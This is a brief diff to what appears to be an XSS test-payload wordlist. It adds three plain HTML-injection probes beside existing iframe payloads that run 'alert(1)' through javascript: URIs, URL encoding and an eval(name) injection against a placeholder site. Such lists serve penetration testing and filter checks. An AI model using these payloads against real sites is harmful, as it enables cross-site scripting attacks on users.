@@ -19,3 +19,6 @@ qq<h1>hi</h1>qq
 <iframe src="javascript:alert(1)"></iframe>
 <iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
 <iframe src="http://target.com/something.jsp?inject=<script>eval(name)</script>" name="alert(1)"></iframe>
+123<h1>hi</h1>
+<h1>hi</h1>123
+123<h1>hi</h1>123
